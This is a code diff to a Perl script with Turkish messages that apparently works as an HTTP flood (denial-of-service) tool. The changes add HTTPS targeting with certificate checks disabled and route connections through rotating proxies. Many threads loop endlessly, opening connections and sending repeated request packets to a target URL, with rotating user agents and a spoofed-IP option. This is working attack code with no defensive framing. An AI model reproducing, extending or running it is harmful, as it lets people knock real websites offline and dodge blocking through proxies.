@@ -34,6 +34,7 @@ sub mas {
 package main;
 use Socket;
 use IO::Socket::INET;
+use IO::Socket::SSL;
 use threads ('yield', 'exit' => 'threads_only', 'stringify');
 use threads::shared;
 
@@ -55,6 +56,7 @@ print "  - Proxy girmezseniz kendi IP adresiniz kullanilir.\n";
 print "\n";
 
 my ($host, $file, $puerto, $porconexion, $ipfake, $max, $sumador, $paquetesender, @thr);
+my $use_ssl = 0;
 
 # Proxy input
 my @proxies;
@@ -88,54 +90,44 @@ sub next_proxy_idx {
     return $idx;
 }
 
-sub direct_connect {
-    my ($host, $port) = @_;
-    return IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto    => 'tcp',
-        Timeout  => 3
-    );
-}
+sub connect_to_target {
+    my ($host, $port, $use_ssl, $proxy_host, $proxy_port) = @_;
 
-sub proxy_connect_or_direct {
-    my ($host, $port) = @_;
-    if(@proxies > 0) {
-        for (my $try = 0; $try < @proxies; $try++) {
-            my $idx = next_proxy_idx();
-            my $proxy = $proxies[$idx];
-            my ($proxy_host, $proxy_port) = split(':', $proxy);
-            my $sock = IO::Socket::INET->new(
-                PeerAddr => $proxy_host,
-                PeerPort => $proxy_port,
-                Proto    => 'tcp',
-                Timeout  => 3
-            );
-            if ($sock) {
-                print $sock "CONNECT $host:$port HTTP/1.1\r\nHost: $host\r\n\r\n";
-                my $line = <$sock>;
-                if ($line && $line =~ /200 Connection established/i) {
-                    return $sock;
-                } else {
-                    close($sock);
-                    print STDERR "[geccsaa] HATA: Proxy baglantisi basarisiz ($line)\n";
-                }
-            } else {
-                print STDERR "[geccsaa] HATA: Proxy socket acilmadi ($!)\n";
-            }
+    my $sock;
+    if ($proxy_host) {
+        # Proxyye bağlan, CONNECT ile tünel aç, gerekirse SSL başlat
+        $sock = IO::Socket::INET->new(PeerAddr=>$proxy_host, PeerPort=>$proxy_port, Proto=>'tcp', Timeout=>4);
+        unless ($sock) {
+            print STDERR "[geccsaa] HATA: Proxy socket acilmadi ($!)\n";
+            return;
         }
-        my $direct_sock = direct_connect($host, $port);
-        if (!$direct_sock) {
-            print STDERR "[geccsaa] HATA: Dogrudan baglanti BASARISIZ! ($!)\n";
+        print $sock "CONNECT $host:$port HTTP/1.1\r\nHost: $host\r\n\r\n";
+        my $line = <$sock>;
+        unless ($line && $line =~ /200 Connection established/i) {
+            print STDERR "[geccsaa] HATA: Proxy CONNECT basarisiz ($line)\n";
+            close($sock);
+            return;
         }
-        return $direct_sock;
+        if ($use_ssl) {
+            IO::Socket::SSL->start_SSL($sock, SSL_verify_mode => 0) or do {
+                print STDERR "[geccsaa] HATA: Proxy uzerinden SSL baglantisi kurulamadi ($!)\n";
+                close($sock);
+                return;
+            };
+        }
     } else {
-        my $direct_sock = direct_connect($host, $port);
-        if (!$direct_sock) {
-            print STDERR "[geccsaa] HATA: Dogrudan baglanti BASARISIZ! ($!)\n";
+        # Doğrudan bağlan (SSL gerekirse SSL socket)
+        if ($use_ssl) {
+            $sock = IO::Socket::SSL->new(PeerAddr=>$host, PeerPort=>$port, SSL_verify_mode=>0, Timeout=>4);
+        } else {
+            $sock = IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp', Timeout=>4);
         }
-        return $direct_sock;
+        unless ($sock) {
+            print STDERR "[geccsaa] HATA: Dogrudan baglanti kurulamadi ($!)\n";
+            return;
+        }
     }
+    return $sock;
 }
 
 my @user_agents = (
@@ -207,10 +199,21 @@ sub generate_effective_http_packet {
 my $hilo;
 my @vals = ('a'..'z', 0..9);
 
+sub select_proxy {
+    if (@proxies > 0) {
+        my $idx = next_proxy_idx();
+        my $proxy = $proxies[$idx];
+        my ($proxy_host, $proxy_port) = split(':', $proxy);
+        return ($proxy_host, $proxy_port);
+    }
+    return (undef, undef);
+}
+
 sub sender {
-    my ($max,$puerto,$host,$file) = @_;
+    my ($max, $host, $port, $use_ssl, $file) = @_;
     while(1) {
-        my $sock = proxy_connect_or_direct($host, $puerto);
+        my ($proxy_host, $proxy_port) = select_proxy();
+        my $sock = connect_to_target($host, $port, $use_ssl, $proxy_host, $proxy_port);
         unless($sock) {
             print STDERR "[geccsaa] HATA: Baglanti kurulamiyor! Bekleniyor...\n";
             sleep(5);
@@ -229,9 +232,10 @@ sub sender {
 }
 
 sub sender2 {
-    my ($puerto,$host,$paquete) = @_;
+    my ($host, $port, $use_ssl, $paquete) = @_;
     while(1) {
-        my $sock = proxy_connect_or_direct($host, $puerto);
+        my ($proxy_host, $proxy_port) = select_proxy();
+        my $sock = connect_to_target($host, $port, $use_ssl, $proxy_host, $proxy_port);
         unless($sock) {
             print STDERR "[geccsaa] HATA: Baglanti kurulamiyor! Bekleniyor...\n";
             sleep(5);
@@ -252,10 +256,11 @@ sub comenzar {
     $porconexion = $ARGV[2];
     $ipfake = $ARGV[3];
     if($porconexion < 1) { exit; }
-    if($url !~ /^http:\/\//) { die("[geccsaa] HATA: Gecersiz URL!\n"); }
-    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
-    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
-    $puerto = 80;
+    $use_ssl = ($url =~ /^https:\/\//i) ? 1 : 0;
+    my $default_port = $use_ssl ? 443 : 80;
+    $url .= "/" if($url =~ /^https?:\/\/([\d\w\:\.-]*)$/);
+    ($host,$file) = ($url =~ /^https?:\/\/(.*?)\/(.*)/);
+    $puerto = $default_port;
     ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
     $file =~ s/\s/ /g;
     $file = "/".$file if($file !~ /^\//);
@@ -264,12 +269,12 @@ sub comenzar {
         $paquetesender = "";
         $paquetesender = $paquetebase x $porconexion;
         for(my $v=0;$v<$max;$v++) {
-            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
+            $thr[$v] = threads->create('sender2', ($host, $puerto, $use_ssl, $paquetesender));
         }
     } else {
         $sumador = control->new($ipfake);
         for(my $v=0;$v<$max;$v++) {
-            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
+            $thr[$v] = threads->create('sender', ($max, $host, $puerto, $use_ssl, $file));
         }
     }
     for(my $v=0;$v<$max;$v++) {
